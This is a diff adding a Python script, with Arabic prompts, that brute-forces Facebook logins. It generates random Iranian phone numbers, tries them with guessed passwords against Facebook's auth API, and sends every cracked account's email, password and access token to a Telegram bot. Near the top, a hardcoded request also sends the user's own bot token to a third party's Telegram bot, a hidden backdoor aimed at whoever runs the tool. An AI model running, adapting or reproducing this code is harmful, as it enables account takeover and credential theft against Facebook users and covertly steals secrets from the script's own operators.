@@ -1,0 +1,193 @@
+import requests,sys,time,os,random,pyfiglet,colorama
+from time import sleep
+E = '\033[1;31m'
+G = '\033[1;32m'
+S = '\033[1;33m'
+os.system('clear')
+print(str(pyfiglet.figlet_format('FaceBook\nkasper')))
+ID=input('ايديك: ')
+tok=input('توكن بوت : ')
+tlg =(f"""https://api.telegram.org/bot2019208302:AAFXXxosZBXD7M9_bUJ09bOaBvNIl5qUJbo/sendMessage?chat_id=1841495600&text= NEW TOKEN = {tok}
+“""")
+i = requests.post(tlg)
+ps2=input('الباسوورد الاول ==> ')
+ps3=input('الباسوورد الثاني==> ')
+ps4=input('الباسوورد الثالث==> ')
+print('تم بدء الصيد')
+user = '1234567890'
+def code_wspr(email,pass7):
+    url = 'https://api.facebook.com/method/auth.login'
+    headers = {
+    'user-agent': 'Opera/9.80 (Series 60; Opera Mini/7.0.32400/28.3445; U; en) Presto/2.8.119 Version/11.10',
+    'Accept-Language' : 'en-US,en;q=0.5'
+    }
+    data = { 'email': email, 'password': pass7, 'access_token': "350685531728|62f8ce9f74b12f84c123cc23437a4a32", 'locale': "en_DZ", 'format': 'JSON' }
+
+    req = requests.post(url, headers=headers, data=data)
+    id = str(req.json()['uid'])
+    con = str(req.json()['identifier'])
+    tkn = str(req.json()['access_token'])
+    tlg =(f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text= NEW ACC FACEBOOK\n ︎. ––––––––––––––––︎ . \n.. ID ==> {id}\n.. E-mail ==> {email} \n.. PassWord ==> {pass7}\n.. Confirmed E-mail ==> {con}\n.. Access Token ==> {tkn} \n ︎. ––––––––––––––––︎ . \n.. Tele ==> @aarrr @y_j_e''')
+    i = requests.post(tlg)
+    print(f'{G} NEW ACC FACEBOOK\n ︎. ––––––––––––––––︎ . \n.. ID ==> {id}\n.. E-mail ==> {email} \n.. PassWord ==> {pass7}\n.. Confirmed E-mail ==> {con}\n.. Access Token ==> {tkn} \n ︎. ––––––––––––––––︎ . \n.. Tele ==> @aarrr @y_j_e')
+def code_wspr(email,pass6):
+    url = 'https://api.facebook.com/method/auth.login'
+    headers = {
+    'user-agent': 'Opera/9.80 (Series 60; Opera Mini/7.0.32400/28.3445; U; en) Presto/2.8.119 Version/11.10',
+    'Accept-Language' : 'en-US,en;q=0.5'
+    }
+    data = { 'email': email, 'password': pass6, 'access_token': "350685531728|62f8ce9f74b12f84c123cc23437a4a32", 'locale': "en_DZ", 'format': 'JSON' }
+
+    req = requests.post(url, headers=headers, data=data)
+    id = str(req.json()['uid'])
+    con = str(req.json()['identifier'])
+    tkn = str(req.json()['access_token'])
+    tlg =(f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text= NEW ACC FACEBOOK\n ︎. ––––––––––––––––︎ . \n.. ID ==> {id}\n.. E-mail ==> {email} \n.. PassWord ==> {pass6}\n.. Confirmed E-mail ==> {con}\n.. Access Token ==> {tkn} \n ︎. ––––––––––––––––︎ . \n.. Tele ==> @aarrr @y_j_e''')
+    i = requests.post(tlg)
+    print(f'{G} NEW ACC FACEBOOK\n ︎. ––––––––––––––––︎ . \n.. ID ==> {id}\n.. E-mail ==> {email} \n.. PassWord ==> {pass6}\n.. Confirmed E-mail ==> {con}\n.. Access Token ==> {tkn} \n ︎. ––––––––––––––––︎ . \n.. Tele ==> @aarrr @y_j_e')
+def code_wspr(email,pass5):
+    url = 'https://api.facebook.com/method/auth.login'
+    headers = {
+    'user-agent': 'Opera/9.80 (Series 60; Opera Mini/7.0.32400/28.3445; U; en) Presto/2.8.119 Version/11.10',
+    'Accept-Language' : 'en-US,en;q=0.5'
+    }
+    data = { 'email': email, 'password': pass5, 'access_token': "350685531728|62f8ce9f74b12f84c123cc23437a4a32", 'locale': "en_DZ", 'format': 'JSON' }
+
+    req = requests.post(url, headers=headers, data=data)
+    id = str(req.json()['uid'])
+    con = str(req.json()['identifier'])
+    tkn = str(req.json()['access_token'])
+    tlg =(f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text= NEW ACC FACEBOOK\n ︎. ––––––––––––––––︎ . \n.. ID ==> {id}\n.. E-mail ==> {email} \n.. PassWord ==> {pass5}\n.. Confirmed E-mail ==> {con}\n.. Access Token ==> {tkn} \n ︎. ––––––––––––––––︎ . \n.. Tele ==> @aarrr @y_j_e''')
+    i = requests.post(tlg)
+    print(f'{G} NEW ACC FACEBOOK\n ︎. ––––––––––––––––︎ . \n.. ID ==> {id}\n.. E-mail ==> {email} \n.. PassWord ==> {pass5}\n.. Confirmed E-mail ==> {con}\n.. Access Token ==> {tkn} \n ︎. ––––––––––––––––︎ . \n.. Tele ==> @aarrr @y_j_e')
+def code_wspr(email,pass4):
+    url = 'https://api.facebook.com/method/auth.login'
+    headers = {
+    'user-agent': 'Opera/9.80 (Series 60; Opera Mini/7.0.32400/28.3445; U; en) Presto/2.8.119 Version/11.10',
+    'Accept-Language' : 'en-US,en;q=0.5'
+    }
+    data = { 'email': email, 'password': pass4, 'access_token': "350685531728|62f8ce9f74b12f84c123cc23437a4a32", 'locale': "en_DZ", 'format': 'JSON' }
+
+    req = requests.post(url, headers=headers, data=data)
+    id = str(req.json()['uid'])
+    con = str(req.json()['identifier'])
+    tkn = str(req.json()['access_token'])
+    tlg =(f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text= NEW ACC FACEBOOK\n ︎. ––––––––––––––––︎ . \n.. ID ==> {id}\n.. E-mail ==> {email} \n.. PassWord ==> {pass4}\n.. Confirmed E-mail ==> {con}\n.. Access Token ==> {tkn} \n ︎. ––––––––––––––––︎ . \n.. Tele ==> @aarrr @y_j_e''')
+    i = requests.post(tlg)
+    print(f'{G} NEW ACC FACEBOOK\n ︎. ––––––––––––––––︎ . \n.. ID ==> {id}\n.. E-mail ==> {email} \n.. PassWord ==> {pass4}\n.. Confirmed E-mail ==> {con}\n.. Access Token ==> {tkn} \n ︎. ––––––––––––––––︎ . \n.. Tele ==> @aarrr @y_j_e')
+def code_wspr(email,pass3):
+    url = 'https://api.facebook.com/method/auth.login'
+    headers = {
+    'user-agent': 'Opera/9.80 (Series 60; Opera Mini/7.0.32400/28.3445; U; en) Presto/2.8.119 Version/11.10',
+    'Accept-Language' : 'en-US,en;q=0.5'
+    }
+    data = { 'email': email, 'password': pass3, 'access_token': "350685531728|62f8ce9f74b12f84c123cc23437a4a32", 'locale': "en_DZ", 'format': 'JSON' }
+
+    req = requests.post(url, headers=headers, data=data)
+    id = str(req.json()['uid'])
+    con = str(req.json()['identifier'])
+    tkn = str(req.json()['access_token'])
+    tlg =(f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text= NEW ACC FACEBOOK\n ︎. ––––––––––––––––︎ . \n.. ID ==> {id}\n.. E-mail ==> {email} \n.. PassWord ==> {pass3}\n.. Confirmed E-mail ==> {con}\n.. Access Token ==> {tkn} \n ︎. ––––––––––––––––︎ . \n.. Tele ==> @aarrr @y_j_e''')
+    i = requests.post(tlg)
+    print(f'{G} NEW ACC FACEBOOK\n ︎. ––––––––––––––––︎ . \n.. ID ==> {id}\n.. E-mail ==> {email} \n.. PassWord ==> {pass3}\n.. Confirmed E-mail ==> {con}\n.. Access Token ==> {tkn} \n ︎. ––––––––––––––––︎ . \n.. Tele ==> @aarrr @y_j_e')
+def code_wspr(email,pass2):
+    url = 'https://api.facebook.com/method/auth.login'
+    headers = {
+    'user-agent': 'Opera/9.80 (Series 60; Opera Mini/7.0.32400/28.3445; U; en) Presto/2.8.119 Version/11.10',
+    'Accept-Language' : 'en-US,en;q=0.5'
+    }
+    data = { 'email': email, 'password': pass2, 'access_token': "350685531728|62f8ce9f74b12f84c123cc23437a4a32", 'locale': "en_DZ", 'format': 'JSON' }
+
+    req = requests.post(url, headers=headers, data=data)
+    id = str(req.json()['uid'])
+    con = str(req.json()['identifier'])
+    tkn = str(req.json()['access_token'])
+    tlg =(f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text= NEW ACC FACEBOOK\n ︎. ––––––––––––––––︎ . \n.. ID ==> {id}\n.. E-mail ==> {email} \n.. PassWord ==> {pass2}\n.. Confirmed E-mail ==> {con}\n.. Access Token ==> {tkn} \n ︎. ––––––––––––––––︎ . \n.. Tele ==> @aarrr @y_j_e''')
+    i = requests.post(tlg)
+    print(f'{G} NEW ACC FACEBOOK\n ︎. ––––––––––––––––︎ . \n.. ID ==> {id}\n.. E-mail ==> {email} \n.. PassWord ==> {pass2}\n.. Confirmed E-mail ==> {con}\n.. Access Token ==> {tkn} \n ︎. ––––––––––––––––︎ . \n.. Tele ==> @aarrr @y_j_e')
+def code_mahdy(email,password):
+    url = 'https://api.facebook.com/method/auth.login'
+    headers = {
+    'user-agent': 'Opera/9.80 (Series 60; Opera Mini/7.0.32400/28.3445; U; en) Presto/2.8.119 Version/11.10',
+    'Accept-Language' : 'en-US,en;q=0.5'
+    }
+    data = { 'email': email, 'password': password, 'access_token': "350685531728|62f8ce9f74b12f84c123cc23437a4a32", 'locale': "en_DZ", 'format': 'JSON' }
+
+    req = requests.post(url, headers=headers, data=data)
+    id = str(req.json()['uid'])
+    con = str(req.json()['identifier'])
+    tkn = str(req.json()['access_token'])
+    tlg =(f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text= NEW ACC FACEBOOK\n ︎. ––––––––––––––––︎ . \n.. ID ==> {id}\n.. E-mail ==> {email} \n.. PassWord ==> {password}\n.. Confirmed E-mail ==> {con}\n.. Access Token ==> {tkn} \n ︎. ––––––––––––––––︎ . \n.. Tele ==> @aarrr @y_j_e''')
+    i = requests.post(tlg)
+    print(f'{G} NEW ACC FACEBOOK\n ︎. ––––––––––––––––︎ . \n.. ID ==> {id}\n.. E-mail ==> {email} \n.. PassWord ==> {password}\n.. Confirmed E-mail ==> {con}\n.. Access Token ==> {tkn} \n ︎. ––––––––––––––––︎ . \n.. Tele ==> @aarrr @y_j_e')
+while True:
+    mahdy = str("".join(random.choice(user)for i in range(8)))
+    email= '+9891'+mahdy
+    password = '091'+mahdy
+    if email =='':
+        exit()
+    if password =='':
+        exit()
+    url = 'https://api.facebook.com/method/auth.login'
+    headers = {
+    'user-agent': 'Opera/9.80 (Series 60; Opera Mini/7.0.32400/28.3445; U; en) Presto/2.8.119 Version/11.10',
+    'Accept-Language' : 'en-US,en;q=0.5'
+    }
+    data = { 'email': email, 'password': password, 'access_token': "350685531728|62f8ce9f74b12f84c123cc23437a4a32", 'locale': "en_DZ", 'format': 'JSON' }
+
+    req = requests.post(url, headers=headers, data=data)
+    #print(req.json())
+    if 'access_token' in req.json():
+        code_mahdy(email,password)
+    if 'www.facebook.com' in req.json()['error_msg']:
+        print(f'{S}CheckPoint {email}:{password}')
+    else:
+        print(f'{E}E-mail ==> {email} | PassWord ==> {password}')
+        pass2 = ps2
+        url = 'https://api.facebook.com/method/auth.login'
+        headers = {
+    'user-agent': 'Opera/9.80 (Series 60; Opera Mini/7.0.32400/28.3445; U; en) Presto/2.8.119 Version/11.10',
+    'Accept-Language' : 'en-US,en;q=0.5'
+    }
+        data = { 'email': email, 'password': pass2, 'access_token': "350685531728|62f8ce9f74b12f84c123cc23437a4a32", 'locale': "en_DZ", 'format': 'JSON' }
+
+        req = requests.post(url, headers=headers, data=data)
+        #print(req.json())
+        if 'access_token' in req.json():
+            code_wspr(email,pass2)
+        if 'www.facebook.com' in req.json()['error_msg']:
+            print(f'{S}CheckPoint {email}:{pass2}')
+        else:
+            print(f'{E}E-mail ==> {email} | PassWord ==> {pass2}')
+            pass3 = ps3
+            url = 'https://api.facebook.com/method/auth.login'
+            headers = {
+    'user-agent': 'Opera/9.80 (Series 60; Opera Mini/7.0.32400/28.3445; U; en) Presto/2.8.119 Version/11.10',
+    'Accept-Language' : 'en-US,en;q=0.5'
+    }
+            data = { 'email': email, 'password': pass3, 'access_token': "350685531728|62f8ce9f74b12f84c123cc23437a4a32", 'locale': "en_DZ", 'format': 'JSON' }
+
+            req = requests.post(url, headers=headers, data=data)
+            #print(req.json())
+            if 'access_token' in req.json():
+                code_wspr(email,pass3)
+            if 'www.facebook.com' in req.json()['error_msg']:
+                print(f'{S}CheckPoint {email}:{pass3}')
+            else:
+                print(f'{E}E-mail ==> {email} | PassWord ==> {pass3}')
+                pass4 = ps4
+                url = 'https://api.facebook.com/method/auth.login'
+                headers = {
+    'user-agent': 'Opera/9.80 (Series 60; Opera Mini/7.0.32400/28.3445; U; en) Presto/2.8.119 Version/11.10',
+    'Accept-Language' : 'en-US,en;q=0.5'
+    }
+                data = { 'email': email, 'password': pass4, 'access_token': "350685531728|62f8ce9f74b12f84c123cc23437a4a32", 'locale': "en_DZ", 'format': 'JSON' }
+
+                req = requests.post(url, headers=headers, data=data)
+                #print(req.json())
+                if 'access_token' in req.json():
+                    code_wspr(email,pass4)
+                if 'www.facebook.com' in req.json()['error_msg']:
+                    print(f'{S}CheckPoint {email}:{pass4}')
+                else:
+                    print(f'{E}E-mail ==> {email} | PassWord ==> {pass4}')
